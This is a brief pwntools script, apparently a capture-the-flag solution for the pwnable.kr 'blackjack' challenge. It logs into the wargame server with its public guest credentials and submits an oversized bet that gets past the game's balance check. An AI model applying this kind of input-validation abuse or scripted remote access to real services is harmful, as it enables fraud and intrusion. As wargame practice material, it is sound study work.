#!/usr/bin/env python3

from pwn import *





s = ssh(host="pwnable.kr", port=2222, user="blackjack", password="guest")
io = s.run('nc 0 9009')

io.recvuntil(b'(Y/N)\n ')
io.send(b'Y')

io.recvuntil(b'Choice: ')
io.send(b'1')

io.recvuntil(b'Enter Bet: $')
io.send(b'5000000000')

io.recvuntil(b'Enter Bet: ')
io.send(b'1000000')



io.interactive()